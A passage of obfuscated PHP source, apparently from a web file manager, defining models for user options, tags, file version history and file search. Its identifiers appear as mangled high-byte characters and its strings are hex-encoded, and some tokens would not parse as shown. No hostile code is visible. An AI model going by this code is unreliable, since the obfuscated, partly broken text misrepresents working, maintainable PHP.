(!in_array($≈Î¿Ìÿ“[$¿Ôé•àÛ[104]], $∂µØñ•ı)) { $•Â§¨Õß[$≈Î¿Ìÿ“[$¿Ôé•àÛ[104]]] = $≈Î¿Ìÿ“[$¿Ôé•àÛ[383]]; } } $´Í≤õø’ = $•Â§¨Õß; } unset($´Í≤õø’); $äËÂ¥¨Ü = Model($¿Ôé•àÛ[2315]); foreach ($ˆÛ¡¬∏ƒ as &$ß‚í≤òí) { $•Ãóã∏ñ = array(); if (isset($ÖÒÌÉê∞[$ß‚í≤òí[$¿Ôé•àÛ[1658]]])) { $•Ãóã∏ñ = $ÖÒÌÉê∞[$ß‚í≤òí[$¿Ôé•àÛ[1658]]]; } $ß‚í≤òí[$¿Ôé•àÛ[2316]] = array(); if (isset($•Ãóã∏ñ[$¨®‚ìàá])) { $ß‚í≤òí[$¿Ôé•àÛ[2316]] = $äËÂ¥¨Ü->getUserJobInfo($•Ãóã∏ñ[$¨®‚ìàá]); } } unset($ß‚í≤òí); } protected function groupUserAll($ØêØÜ†´) { $Í≥¶Îëº =& $_SERVER[Á≈ ä ∞]; if (!$ØêØÜ†´) { return !1; } $ÆÁÇ˙áı = Model($Í≥¶Îëº[1920])->field($Í≥¶Îëº[1658])->where(array($Í≥¶Îëº[1830] => array($Í≥¶Îëº[17], $ØêØÜ†´)))->select(); $ÆÁÇ˙áı = array_to_keyvalue($ÆÁÇ˙áı, $Í≥¶Îëº[22], $Í≥¶Îëº[1658]); return array_unique($ÆÁÇ˙áı); } public function userSearch($É¶ºÖÏÏ, $≠çêÃªû = "\x2a") { return Model($_SERVER[Á≈ ä ∞][544])->where($É¶ºÖÏÏ)->field($≠çêÃªû)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\162\137\x6f\160\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($‚û¶óÃÎ) { $ïÀò±Í° =& $_SERVER[Á≈ ä ∞]; if (!defined($ïÀò±Í°[484])) { define($ïÀò±Í°[484], 0); } return "\125\163\x65\162\117\x70\164\x69\157\x6e\137{$‚û¶óÃÎ}\137" . USER_ID; } protected function filterWhere($«±‹”¯¶) { $ù‡¸¬•â =& $_SERVER[Á≈ ä ∞]; if (!defined($ù‡¸¬•â[484])) { define($ù‡¸¬•â[484], 0); } $«±‹”¯¶[$ù‡¸¬•â[1658]] = USER_ID; return $«±‹”¯¶; } public function cacheRemoveUser($ıΩ∞Æüö, $ôŒéﬁß») { return Cache::remove("\125\163\x65\162\117\x70\x74\151\157\156\137{$ıΩ∞Æüö}\x5f" . $ôŒéﬁß»); } protected function optionDefault($ä∏‡˜Ú” = '') { $›Æ±ﬂ≥Ω =& $_SERVER[Á≈ ä ∞]; if ($ä∏‡˜Ú” == $›Æ±ﬂ≥Ω[22]) { return $GLOBALS[$›Æ±ﬂ≥Ω[16]][$›Æ±ﬂ≥Ω[2317]]; } if ($ä∏‡˜Ú” == $›Æ±ﬂ≥Ω[2318]) { return $GLOBALS[$›Æ±ﬂ≥Ω[16]][$›Æ±ﬂ≥Ω[2319]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\56\164\x61\147\x4c\151\163\164"; public $modelType = "\x55\x73\x65\162\x4f\x70\164\151\157\x6e"; public $field = array("\156\x61\155\145", "\x73\164\x79\154\x65", "\x73\x6f\162\164"); public function listData($¡Ä¬Ë©Ü = false, $ôπ„‡¶› = "\163\157\x72\x74", $ÌÎ«ÿ∞Ë = false) { return parent::listData($¡Ä¬Ë©Ü, $ôπ„‡¶›, $ÌÎ«ÿ∞Ë); } public function remove($ê¶˜›Ãﬂ) { return parent::remove($ê¶˜›Ãﬂ); } public function add($˚∏Ω˛¡Ö, $ªËØÑ±‰ = "\x6c\141\142\145\154\x2d\x67\162\145\171\x2d\156\x6f\162\155\x61\x6c") { $ó÷™≠‡Ï =& $_SERVER[Á≈ ä ∞]; if ($this->findByName($˚∏Ω˛¡Ö)) { return !1; } $¥†™ƒú˛ = array($ó÷™≠‡Ï[429] => $˚∏Ω˛¡Ö, $ó÷™≠‡Ï[494] => $ªËØÑ±‰, $ó÷™≠‡Ï[1834] => $this->getSort($ó÷™≠‡Ï[267]) + 1); return parent::insert($¥†™ƒú˛); } public function update($ûÄÆ˚ªô, $í‰Ó’Ø¨) { $ﬁ∫Á…Í≈ =& $_SERVER[Á≈ ä ∞]; $¡ÅüØ≥Ω = $this->listData($ûÄÆ˚ªô); $É÷≤∆®Œ = $this->findByName($í‰Ó’Ø¨[$ﬁ∫Á…Í≈[42]]); if (!$¡ÅüØ≥Ω || $É÷≤∆®Œ && $É÷≤∆®Œ[$ﬁ∫Á…Í≈[408]] != $¡ÅüØ≥Ω[$ﬁ∫Á…Í≈[408]]) { return !1; } return parent::update($ûÄÆ˚ªô, $í‰Ó’Ø¨); } public function moveTop($¥Ä®Ûøº) { $˝⁄ñÃÇÂ =& $_SERVER[Á≈ ä ∞]; $Ç⁄Áıπñ = parent::listData(); $Ã∞ö¨ªå = $this->getSort($˝⁄ñÃÇÂ[266]); foreach ($Ç⁄Áıπñ as &$¢∏†¬Éé) { if ($¢∏†¬Éé[$˝⁄ñÃÇÂ[408]] == $¥Ä®Ûøº) { $¢∏†¬Éé[$˝⁄ñÃÇÂ[1854]] = $Ã∞ö¨ªå; continue; } $¢∏†¬Éé[$˝⁄ñÃÇÂ[1854]] += 1; } unset($¢∏†¬Éé); return parent::resetData($Ç⁄Áıπñ); } public function moveBottom($≈îÈñı∑) { $åîóò„Ç =& $_SERVER[Á≈ ä ∞]; $¬¸Ü“Í = $this->getSort($åîóò„Ç[267]) + 1; return parent::update($≈îÈñı∑, array($åîóò„Ç[1854] => $¬¸Ü“Í)); } public function resetSort($úı⁄∑Å≥) { $õ“«ÚÈÙ =& $_SERVER[Á≈ ä ∞]; $ÔΩŸıà» = array(); $úı⁄∑Å≥ = is_array($úı⁄∑Å≥) ? $úı⁄∑Å≥ : array(); for ($ÎÁ◊æ™ë = 0; $ÎÁ◊æ™ë < count($úı⁄∑Å≥); $ÎÁ◊æ™ë++) { $ÔΩŸıà»[$úı⁄∑Å≥[$ÎÁ◊æ™ë] . $õ“«ÚÈÙ[22]] = $ÎÁ◊æ™ë + 1; } $ÂÙ÷á‘ô = parent::listData(); foreach ($ÂÙ÷á‘ô as &$‚¨‰ÛÂ«) { $∆ìÀ¯ãô = $ÔΩŸıà»[$‚¨‰ÛÂ«[$õ“«ÚÈÙ[408]]]; $‚¨‰ÛÂ«[$õ“«ÚÈÙ[1854]] = $∆ìÀ¯ãô ? $∆ìÀ¯ãô : $‚¨‰ÛÂ«[$õ“«ÚÈÙ[1854]]; } unset($‚¨‰ÛÂ«); return parent::resetData($ÂÙ÷á‘ô); } private function getSort($ã‰±´’“) { $Õ¢‘”¬‘ =& $_SERVER[Á≈ ä ∞]; $£ºÅë¸∫ = parent::listData(); $∞à≥‡ÿÉ = array_to_keyvalue($£ºÅë¸∫, $Õ¢‘”¬‘[22], $Õ¢‘”¬‘[1854]); if (!$∞à≥‡ÿÉ) { $∞à≥‡ÿÉ = array(0); } $—÷¨»»“ = $ã‰±´’“ == $Õ¢‘”¬‘[267] ? max($∞à≥‡ÿÉ) : min($∞à≥‡ÿÉ); return intval($—÷¨»»“); } } goto dâ≠™í≈©“; Aü°·É˜âË: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\x75\x72\x63\x65\137\150\151\163\x74\157\x72\x79"; public function historyCount($ö∏—“è√) { $ê¸∫¶ƒ∆ =& $_SERVER[Á≈ ä ∞]; if (!$ö∏—“è√) { return array(); } if (is_string($ö∏—“è√) || is_int($ö∏—“è√)) { $ö∏—“è√ = array($ö∏—“è√); } $òëï∏˙ƒ = array($ê¸∫¶ƒ∆[411], $ê¸∫¶ƒ∆[1863] => $ê¸∫¶ƒ∆[509]); $ÖÒ…ìº∞ = array($ê¸∫¶ƒ∆[411] => array($ê¸∫¶ƒ∆[17], $ö∏—“è√)); $Ÿ–≠÷ôà = $this->field($òëï∏˙ƒ)->where($ÖÒ…ìº∞)->group($ê¸∫¶ƒ∆[411])->select(); return array_to_keyvalue($Ÿ–≠÷ôà, $ê¸∫¶ƒ∆[411], $ê¸∫¶ƒ∆[509]); } public function addHistory($åéßÈﬁç, $Ñ€æóòØ = '') { $ÀïÙ©«ì =& $_SERVER[Á≈ ä ∞]; $∂Êœ¬‹˛ = array($ÀïÙ©«ì[426] => $åéßÈﬁç[$ÀïÙ©«ì[411]], $ÀïÙ©«ì[1649] => isset($åéßÈﬁç[$ÀïÙ©«ì[465]]) ? $åéßÈﬁç[$ÀïÙ©«ì[465]] : $åéßÈﬁç[$ÀïÙ©«ì[463]], $ÀïÙ©«ì[478] => $åéßÈﬁç[$ÀïÙ©«ì[477]], $ÀïÙ©«ì[594] => $åéßÈﬁç[$ÀïÙ©«ì[86]], $ÀïÙ©«ì[2069] => $Ñ€æóòØ); if ($GLOBALS[$ÀïÙ©«ì[16]][$ÀïÙ©«ì[99]][$ÀïÙ©«ì[1212]] >= 1) { $this->historyAutoClear($∂Êœ¬‹˛[$ÀïÙ©«ì[411]]); $this->add($∂Êœ¬‹˛); } Hook::trigger($ÀïÙ©«ì[2070], $∂Êœ¬‹˛); Model($ÀïÙ©«ì[2071])->eventFileEdit($åéßÈﬁç[$ÀïÙ©«ì[411]]); } private function historyAutoClear($»Ô¶¯ÒÃ) { $ƒÿΩ’íö =& $_SERVER[Á≈ ä ∞]; $ƒ≠‹ëΩÍ = Model($ƒÿΩ’íö[777])->get($ƒÿΩ’íö[1234]); $”˝ûà™π = $GLOBALS[$ƒÿΩ’íö[16]][$ƒÿΩ’íö[99]][$ƒÿΩ’íö[1212]]; $–ÚØ‡≤® = $ƒ≠‹ëΩÍ == $ƒÿΩ’íö[1235] ? min(5, $”˝ûà™π) : $”˝ûà™π; $–ÚØ‡≤® = $–ÚØ‡≤® <= 0 ? 0 : $–ÚØ‡≤® - 1; if ($–ÚØ‡≤® >= 500) { return; } $ËãØÒÉ… = array($ƒÿΩ’íö[426] => $»Ô¶¯ÒÃ); $πÂ∞Á◊´ = $this->field($ƒÿΩ’íö[2072])->where($ËãØÒÉ…)->order($ƒÿΩ’íö[2066])->select(); if (!$πÂ∞Á◊´ || $–ÚØ‡≤® >= count($πÂ∞Á◊´)) { return; } $™ﬁÊÌ¸• = array_to_keyvalue($πÂ∞Á◊´, $ƒÿΩ’íö[22], $ƒÿΩ’íö[408]); $™ﬁÊÌ¸• = array_slice($™ﬁÊÌ¸•, $–ÚØ‡≤®); $ëÇï¯ëø = array_to_keyvalue($πÂ∞Á◊´, $ƒÿΩ’íö[22], $ƒÿΩ’íö[477]); $ëÇï¯ëø = array_slice($ëÇï¯ëø, $–ÚØ‡≤®); if (!$™ﬁÊÌ¸• || !$ëÇï¯ëø) { return; } $ËãØÒÉ… = array($ƒÿΩ’íö[428] => array($ƒÿΩ’íö[17], $™ﬁÊÌ¸•)); $this->where($ËãØÒÉ…)->delete(); Model($ƒÿΩ’íö[480])->remove($ëÇï¯ëø); } public function listData($ƒÚ¯Öƒˆ) { $Òï¿•´ß =& $_SERVER[Á≈ ä ∞]; $â•äÙ∑í = array($Òï¿•´ß[426] => $ƒÚ¯Öƒˆ); $Û•≈Á…Î = $Òï¿•´ß[2073]; $πÆÊÚ„Ù = $this->field($Û•≈Á…Î)->where($â•äÙ∑í)->order($Òï¿•´ß[2066])->selectPage(); $this->_listAppendUser($πÆÊÚ„Ù[$Òï¿•´ß[378]]); $ÿ⁄èºÈ≥ = Model($Òï¿•´ß[777])->get($Òï¿•´ß[1234]); $»ÓÉÇ˜⁄ = 5; if ($ÿ⁄èºÈ≥ == $Òï¿•´ß[1235]) { $πÆÊÚ„Ù[$Òï¿•´ß[378]] = array_slice($πÆÊÚ„Ù[$Òï¿•´ß[378]], 0, $»ÓÉÇ˜⁄); $πÆÊÚ„Ù[$Òï¿•´ß[375]] = array($Òï¿•´ß[2074] => 1, $Òï¿•´ß[2075] => 20, $Òï¿•´ß[2076] => 1, $Òï¿•´ß[2077] => count($πÆÊÚ„Ù[$Òï¿•´ß[378]])); } return $πÆÊÚ„Ù; } protected function _listAppendUser(&$ ﬁı¨îƒ) { $œÜÁ÷º√ =& $_SERVER[Á≈ ä ∞]; $ΩùëïùŸ = array_to_keyvalue($ ﬁı¨îƒ, $œÜÁ÷º√[22], $œÜÁ÷º√[1658]); $æ≠ÆêÁ• = Model($œÜÁ÷º√[544])->userListInfo($ΩùëïùŸ); foreach ($ ﬁı¨îƒ as &$∫™“◊”¢) { $üÓˆ»úµ = $∫™“◊”¢[$œÜÁ÷º√[1658]]; $∫™“◊”¢[$œÜÁ÷º√[463]] = $æ≠ÆêÁ•[$üÓˆ»úµ] ? $æ≠ÆêÁ•[$üÓˆ»úµ] : !1; } unset($∫™“◊”¢); } public function fileInfo($ÕàﬁÒ≈ê) { $â∑˛á£◊ =& $_SERVER[Á≈ ä ∞]; $›Å◊¿…Ê = $this->tablePrefix; $‰ò˜éó  = "{$›Å◊¿…Ê}\x69\157\137\146\x69\154\145\x20\146\151\x6c\x65\x73\x20\x6f\x6e\x20\x66\151\154\x65\x73\x2e\146\x69\154\x65\111\104\40\75\40\150\x69\163\x74\157\x72\171\56\x66\151\x6c\x65\x49\104"; return $this->alias($â∑˛á£◊[2078])->where(array($â∑˛á£◊[428] => $ÕàﬁÒ≈ê))->join($‰ò˜éó , $â∑˛á£◊[2079])->find(); } public function removeItem($≈Õ…˛ﬁ≠) { $ñÇ≥ã˝Î =& $_SERVER[Á≈ ä ∞]; $¡ÍÀÛ«ﬂ = array($ñÇ≥ã˝Î[428] => $≈Õ…˛ﬁ≠); $‘⁄ò˛ÆÆ = $this->where($¡ÍÀÛ«ﬂ)->find(); if ($‘⁄ò˛ÆÆ) { $˘Î˚Äﬂﬁ = $this->where($¡ÍÀÛ«ﬂ)->delete(); Model($ñÇ≥ã˝Î[480])->remove($‘⁄ò˛ÆÆ[$ñÇ≥ã˝Î[477]]); return $˘Î˚Äﬂﬁ; } return !1; } public function removeBySource($Ê’ÔçåÀ) { $¡ŸùÉÚ§ =& $_SERVER[Á≈ ä ∞]; if (!$Ê’ÔçåÀ) { return !1; } if (!is_array($Ê’ÔçåÀ)) { $Ê’ÔçåÀ = array($Ê’ÔçåÀ); } $ìœé‰ Ü = array($¡ŸùÉÚ§[426] => array($¡ŸùÉÚ§[17], $Ê’ÔçåÀ)); $Üë˛‘Åà = $this->field($¡ŸùÉÚ§[478])->where($ìœé‰ Ü)->select(); if ($Üë˛‘Åà) { $this->where($ìœé‰ Ü)->delete(); $ÜÅä≈Œû = array_to_keyvalue($Üë˛‘Åà, $¡ŸùÉÚ§[22], $¡ŸùÉÚ§[477]); Model($¡ŸùÉÚ§[480])->remove($ÜÅä≈Œû); } return !0; } public function setDetail($∂Øúàã≥, $…˛æ¢ú°) { $ÉÃ≠™≈œ =& $_SERVER[Á≈ ä ∞]; return $this->where(array($ÉÃ≠™≈œ[428] => $∂Øúàã≥))->save(array($ÉÃ≠™≈œ[2069] => $…˛æ¢ú°)); } public function rollbackToItem($˘§Ä™˘¥, $∞˙¶ºŒ—) { $ﬂçªô∂è =& $_SERVER[Á≈ ä ∞]; $¥ÌöÂÚ± = Model($ﬂçªô∂è[832])->sourceInfo($˘§Ä™˘¥); $this->addHistory($¥ÌöÂÚ±, LNG($ﬂçªô∂è[2080])); $™êª«è∏ = $this->find($∞˙¶ºŒ—); $—èÎ˙Æé = array($ﬂçªô∂è[477] => $™êª«è∏[$ﬂçªô∂è[477]], $ﬂçªô∂è[86] => $™êª«è∏[$ﬂçªô∂è[86]], $ﬂçªô∂è[95] => time(), $ﬂçªô∂è[465] => USER_ID); Model($ﬂçªô∂è[832])->where(array($ﬂçªô∂è[411] => $˘§Ä™˘¥))->save($—èÎ˙Æé); return $this->where(array($ﬂçªô∂è[428] => $∞˙¶ºŒ—))->delete(); } public function clearSame($º∏–º»è) { $∏¥ﬁìˆÕ =& $_SERVER[Á≈ ä ∞]; $ÏüÄÀá™ = $this->listData($º∏–º»è); $Î√≥íΩ˘ = array_to_keyvalue_group($ÏüÄÀá™, $∏¥ﬁìˆÕ[477]); $úÚè‰ö˜ = array(); $‰ÆÄûË— = array(); foreach ($Î√≥íΩ˘ as $Ï´€õ¢‰) { if (!$Ï´€õ¢‰ || count($Ï´€õ¢‰) <= 1) { continue; } foreach ($Ï´€õ¢‰ as $Ó··áÿú) { $úÚè‰ö˜[] = $Ó··áÿú[$∏¥ﬁìˆÕ[477]]; $‰ÆÄûË—[] = $Ó··áÿú[$∏¥ﬁìˆÕ[408]]; } } if (!$‰ÆÄûË—) { return; } $this->where(array($∏¥ﬁìˆÕ[408] => array($∏¥ﬁìˆÕ[17], $‰ÆÄûË—)))->delete(); Model($∏¥ﬁìˆÕ[480])->remove($úÚè‰ö˜); } public function userSpace() { $’åÂ∂ˆ∂ =& $_SERVER[Á≈ ä ∞]; $ãÇäı‚≥ = $this->tablePrefix; $•†è ÁÊ = array($’åÂ∂ˆ∂[1649] => USER_ID); $”ßÙ”ª = "{$ãÇäı‚≥}\151\x6f\137\146\151\x6c\145\40\146\151\154\145\x73\x20\x6f\x6e\x20\x66\x69\154\145\163\56\146\x69\x6c\x65\x49\104\40\75\40\x68\151\x73\x74\157\x72\171\56\146\x69\154\145\x49\104"; return $this->alias($’åÂ∂ˆ∂[2078])->where($•†è ÁÊ)->join($”ßÙ”ª, $’åÂ∂ˆ∂[2079])->sum($’åÂ∂ˆ∂[86]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Œ≥îÚﬂ) { $·ÕÂ˙âÙ =& $_SERVER[Á≈ ä ∞]; $ô£ªÓœ∞ = KodIO::fileTypeList(); $î™€ìç˚ = $ô£ªÓœ∞[$Œ≥îÚﬂ]; if (!$î™€ìç˚) { return array(); } $ñå‘·≥æ = $î™€ìç˚[$·ÕÂ˙âÙ[184]]; $Ö˙ÌöëØ = $·ÕÂ˙âÙ[17]; if (!$î™€ìç˚[$·ÕÂ˙âÙ[184]]) { $Ô≠Ωéˆœ = array_to_keyvalue($ô£ªÓœ∞, $·ÕÂ˙âÙ[22], $·ÕÂ˙âÙ[184]); $ñå‘·≥æ = implode($·ÕÂ˙âÙ[60], $Ô≠Ωéˆœ); $Ö˙ÌöëØ = $·ÕÂ˙âÙ[2081]; } $òà¸ó—µ = explode($·ÕÂ˙âÙ[60], trim($ñå‘·≥æ, $·ÕÂ˙âÙ[60])); return array($Ö˙ÌöëØ, $òà¸ó—µ); } public function listPathType($Å•ÿüîŒ) { $∑¸‹ûÅ∫ =& $_SERVER[Á≈ ä ∞]; $úÅÜ≤ã€ = $this->fileTypeWhere($Å•ÿüîŒ); if (!$úÅÜ≤ã€) { return array(); } $Ñµ”˝Ö… = USER_ID; $≈ä≤‘˚Ù = Model($∑¸‹ûÅ∫[544])->getInfo($Ñµ”˝Ö…); $ÄªÂÅ∑◊ = array($∑¸‹ûÅ∫[595] => SourceModel::TYPE_USER, $∑¸‹ûÅ∫[530] => array($∑¸‹ûÅ∫[559], $∑¸‹ûÅ∫[540] . $≈ä≤‘˚Ù[$∑¸‹ûÅ∫[96]][$∑¸‹ûÅ∫[411]] . $∑¸‹ûÅ∫[560]), $∑¸‹ûÅ∫[596] => $Ñµ”˝Ö…, $∑¸‹ûÅ∫[592] => 0, $∑¸‹ûÅ∫[593] => $úÅÜ≤ã€); return $this->listSource($ÄªÂÅ∑◊); } public function listSearch($¯ÃÂùÖÜ, $ßÑÏ≈ì = 300) { $ÕçÔ¡ÒÔ =& $_SERVER[Á≈ ä ∞]; if (isset($¯ÃÂùÖÜ[$ÕçÔ¡ÒÔ[1924]]) && $¯ÃÂùÖÜ[$ÕçÔ¡ÒÔ[1924]]) { $¯ÃÂùÖÜ[$ÕçÔ¡ÒÔ[1924]] = str_replace($ÕçÔ¡ÒÔ[393], $ÕçÔ¡ÒÔ[2082], trim($¯ÃÂùÖÜ[$ÕçÔ¡ÒÔ[1924]])); } $µåç·˙† = $this->_parseSearchWhere($¯ÃÂùÖÜ); if (!isset($µåç·˙†[$ÕçÔ¡ÒÔ[440]])) { $µåç·˙†[$ÕçÔ¡ÒÔ[440]] = 0; } $ÃÖ¨¶œ» = $ÕçÔ¡ÒÔ[2083]; $∞∂ôÙ¥‘ = $µåç·˙†; $ß∑⁄Á ú = $ÃÖ¨¶œ»; $this->_listSearchBindPinyin($¯ÃÂùÖÜ, $µåç·˙†, $ÃÖ¨¶œ»); $this->alias($ÕçÔ¡ÒÔ[455])->_makeOrder(); $µåç·˙† = $this->parseWhereLike($µåç·˙†); $ï∑√á≠⁄ = $this->distinct(!0)->field($ÃÖ¨¶œ»)->where($µåç·˙†)->selectPage($ßÑÏ≈ì); if ($GLOBALS[$ÕçÔ¡ÒÔ[16]][$ÕçÔ¡ÒÔ[390]][$ÕçÔ¡ÒÔ[391]] && Input::check($¯ÃÂùÖÜ[$ÕçÔ¡ÒÔ[1924]], $ÕçÔ¡ÒÔ[602]) && $ï∑√á≠⁄[$ÕçÔ¡ÒÔ[375]][$ÕçÔ¡ÒÔ[362]] == 1 && $ï∑√á≠⁄[$ÕçÔ¡ÒÔ[375]][$ÕçÔ¡ÒÔ[376]] == 0) { $ï∑√á≠⁄ = $this->distinct(!0)->field($ÃÖ¨¶œ»)->where($∞∂ôÙ¥‘)->limit(1000)->select(); $ï∑√á≠⁄ = array_page_split($ï∑√á≠⁄, !1, $ßÑÏ≈ì); } $this->_listSearchFileContent($ï∑√á≠⁄, $¯ÃÂùÖÜ, $ß∑⁄Á ú, $∞∂ôÙ¥‘); $this->_listSearchDesc($ï∑√á≠⁄, $¯ÃÂùÖÜ, $ß∑⁄Á ú); $this->_listSearchTag($ï∑√á≠⁄, $¯ÃÂùÖÜ, $ß∑⁄Á ú); $this->_listSearchGroupTag($ï∑√á≠⁄, $¯ÃÂùÖÜ, $ß∑⁄Á ú); $this->_listDataApply($ï∑√á≠⁄[$ÕçÔ¡ÒÔ[378]]); $this->_listMake($ï∑√á≠⁄); return $ï∑√á≠⁄; } private function _listSearchFileContent(&$ä–·ºÏ–, $€É‹˝Éü, $ÙõÔï™¶, $ëûä«⁄È) { $ì∆úôÒ≤ =& $_SERVER[Á≈ ä ∞]; if (!$€É‹˝Éü[$ì∆úôÒ≤[1924]] || $ä–·ºÏ–[$ì∆úôÒ≤[375]][$ì∆úôÒ≤[362]] > 1) { return; } if (!isset($ëûä«⁄È[$ì∆úôÒ≤[42]]) || !is_array($€É‹˝Éü[$ì∆úôÒ≤[477]])) { return; } $ëûä«⁄È[$ì∆úôÒ≤[477]] = array($ì∆úôÒ≤[17], $€É‹˝Éü[$ì∆úôÒ≤[477]]); unset($ëûä«⁄È[$ì∆úôÒ≤[42]]); unset($€É‹˝Éü[$ì∆úôÒ≤[477]]); $∆¨®Ó„œ = $this->field($ÙõÔï™¶)->where($ëûä«⁄È)->limit($ì∆úôÒ≤[2084])->select(); if (!$∆¨®Ó„œ || count($∆¨®Ó„œ) == 0) { return; } $ä–·ºÏ–[$ì∆úôÒ≤[378]] = array_merge($∆¨®Ó„œ, $ä–·ºÏ–[$ì∆úôÒ≤[378]]); $ä–·ºÏ–[$ì∆úôÒ≤[375]][$ì∆úôÒ≤[376]] += count($∆¨®Ó„œ); } private function _listSearchTag(&$¸ﬁ›÷†Œ, $…º™£Ûù, $‡å Â∫Ü) { $°õªÈ“‹ =& $_SERVER[Á≈ ä ∞]; if (!$…º™£Ûù[$°õªÈ“‹[1924]] || $¸ﬁ›÷†Œ[$°õªÈ“‹[375]][$°õªÈ“‹[362]] > 1) { return; } $¡Ñ◊≤¬‘ = Model($°õªÈ“‹[2085])->listData(); $»∂Ä∆Ù± = array(); $Ù‘†–ú∑ = $…º™£Ûù[$°õªÈ“‹[1924]]; foreach ($¡Ñ◊≤¬‘ as $ØÌ∆≈ÂÈ) { $ŸƒÜ‚◊ú = $ØÌ∆≈ÂÈ[$°õªÈ“‹[42]]; $ºÃµ¬©≠ = str_replace($°õªÈ“‹[63], $°õªÈ“‹[22], Pinyin::get($ŸƒÜ‚◊ú)); if (stripos($ŸƒÜ‚◊ú, $Ù‘†–ú∑) !== !1 || stripos($ºÃµ¬©≠, $Ù‘†–ú∑) !== !1) { $»∂Ä∆Ù±[] = $ØÌ∆≈ÂÈ[$°õªÈ“‹[408]]; } } if (!$»∂Ä∆Ù±) { return; } $àØﬂå¯∏ = array($°õªÈ“‹[435] => array($°õªÈ“‹[17], $»∂Ä∆Ù±), $°õªÈ“‹[1658] => USER_ID); $ñ»ñú±∞ = Model($°õªÈ“‹[437])->field($°õªÈ“‹[94])->where($àØﬂå¯∏)->select(); $ñ»ñú±∞ = array_to_keyvalue($ñ»ñú±∞, $°õªÈ“‹[22], $°õªÈ“‹[94]); $’ΩÏ†˚Ï = array_unique($ñ»ñú±∞); $this->_listSearchMerge($¸ﬁ›÷†Œ, $…º™£Ûù, $‡å Â∫Ü, $’ΩÏ†˚Ï); } private function _listSearchDesc(&$î’–„’Ò, $Âø∞Õøã, $µÖœ⁄öè) { $ÍÃØﬁ˚ﬁ =& $_SERVER[Á≈ ä ∞]; if (!$Âø∞Õøã[$ÍÃØﬁ˚ﬁ[1924]] || $î’–„’Ò[$ÍÃØﬁ˚ﬁ[375]][$ÍÃØﬁ˚ﬁ[362]] > 1) { return; } $’ÎàÔüÿ = array($ÍÃØﬁ˚ﬁ[104] => $ÍÃØﬁ˚ﬁ[462], $ÍÃØﬁ˚ﬁ[383] => array($ÍÃØﬁ˚ﬁ[392], $ÍÃØﬁ˚ﬁ[1926] . $Âø∞Õøã[$ÍÃØﬁ˚ﬁ[1924]] . $ÍÃØﬁ˚ﬁ[1926])); $ΩßøÜ˚¿ = !1; if ($ΩßøÜ˚¿) { $Àå‚¢ÚÅ = $this->listSearchChildren($Âø∞Õøã[$ÍÃØﬁ˚ﬁ[441]]); $Àå‚¢ÚÅ = array_unique($Àå‚¢ÚÅ); if (!$Àå‚¢ÚÅ) { return; } $’ÎàÔüÿ[$ÍÃØﬁ˚ﬁ[411]] = array($ÍÃØﬁ˚ﬁ[17], $Àå‚¢ÚÅ); } $Ë˝∫°Î˛ = Model($ÍÃØﬁ˚ﬁ[578])->field($ÍÃØﬁ˚ﬁ[411])->where($’ÎàÔüÿ)->limit(5000)->select(); $–Îõÿ‰¬ = array_to_keyvalue($Ë˝∫°Î˛, $ÍÃØﬁ˚ﬁ[22], $ÍÃØﬁ˚ﬁ[411]); $this->_listSearchMerge($î’–„’Ò, $Âø∞Õøã, $µÖœ⁄öè, $–Îõÿ‰¬); } private function _listSearchGroupTag(&$°Ø≥¸É«, $Ä òï”Ø, $≥¯Œ¡˝) { $√†Ã“ΩÊ =& $_SERVER[Á≈ ä ∞]; if (!$Ä òï”Ø[$√†Ã“ΩÊ[1924]] || $°Ø≥¸É«[$√†Ã“ΩÊ[375]][$√†Ã“ΩÊ[362]] > 1 || !$Ä òï”Ø[$√†Ã“ΩÊ[441]]) { return; } $™ÄØúﬁ¿ = $this->sourceInfo($Ä òï”Ø[$√†Ã“ΩÊ[441]]); if (!$™ÄØúﬁ¿ || $™ÄØúﬁ¿[$√†Ã“ΩÊ[420]] != SourceModel::TYPE_GROUP) { return; } $Ú˝∆∞ï∑ = $™ÄØúﬁ¿[$√†Ã“ΩÊ[514]]; $˜ƒÎÒ«˙ = Model($√†Ã“ΩÊ[2086])->get($Ú˝∆∞ï∑); $Ù◊üÃªû = array(); $«œﬁ„ÒÊ = $Ä òï”Ø[$√†Ã“ΩÊ[1924]]; foreach ($˜ƒÎÒ«˙[$√†Ã“ΩÊ[378]] as $¥ä–±È√) { $πÂœÌ©÷ = $¥ä–±È√[$√†Ã“ΩÊ[42]]; $êÏÙõ±∑ = str_replace($√†Ã“ΩÊ[63], $√†Ã“ΩÊ[22], Pinyin::get($πÂœÌ©÷)); if (stripos($πÂœÌ©÷, $«œﬁ„ÒÊ) !== !1 || stripos($êÏÙõ±∑, $«œﬁ„ÒÊ) !== !1) { $Ù◊üÃªû[] = $¥ä–±È√[$√†Ã“ΩÊ[408]]; } } if (!$Ù◊üÃªû) { return; } $ˆÆÉÂ◊ò = array($√†Ã“ΩÊ[435] => array($√†Ã“ΩÊ[17], $Ù◊üÃªû), $√†Ã“ΩÊ[1658] => 0, $√†Ã“ΩÊ[43] => $√†Ã“ΩÊ[1946] . $Ú˝∆∞ï∑); $Ùã‘©∫˚ = Model($√†Ã“ΩÊ[437])->field($√†Ã“ΩÊ[94])->where($ˆÆÉÂ◊ò)->select(); $Ùã‘©∫˚ = array_to_keyvalue($Ùã‘©∫˚, $√†Ã“ΩÊ[22], $√†Ã“ΩÊ[94]); $—‰äπÏß = array_unique($Ùã‘©∫˚); $this->_listSearchMerge($°Ø≥¸É«, $Ä òï”Ø, $≥¯Œ¡˝, $—‰äπÏß); } private function _listSearchMerge(&$∞ô˛·∫∂, $ÿÀ‡Àƒ˚, $ÌÖ¿„†, $Í˝Ò˙˘¨) { $ä…„«ú· =& $_SERVER[Á≈ ä ∞]; if (!$Í˝Ò˙˘¨) { return; } $ÆÃŒ¬Ê· = array_to_keyvalue($∞ô˛·∫∂[$ä…„«ú·[378]], $ä…„«ú·[22], $ä…„«ú·[411]); $üú˚é‘— = array_diff($Í˝Ò˙˘¨, $ÆÃŒ¬Ê·); if (!$üú˚é‘—) { return; } $Ü†¶Õ±® = array($ä…„«ú·[411] => array($ä…„«ú·[17], $üú˚é‘—)); $´Ï⁄πãê = $this->field($ÌÖ¿„†)->where($Ü†¶Õ±®)->select(); if (!$´Ï⁄πãê) { return; 